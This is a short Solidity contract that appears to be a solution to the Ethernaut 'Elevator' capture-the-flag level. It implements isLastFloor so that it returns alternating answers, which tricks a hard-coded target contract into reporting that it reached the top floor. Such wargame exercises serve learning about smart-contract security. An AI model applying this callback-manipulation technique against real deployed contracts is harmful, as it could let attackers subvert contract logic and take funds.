//SPDX-License-Identifier: None
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {

    Elevator elevator = Elevator(0x39216A762F69e3bc924246695F57fB7E35a86576);
    bool flip = true;

    function win() public {
        elevator.goTo(69);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (flip) {
            flip = false;
        } else {
            flip = true;
        }
        return flip;
    }
}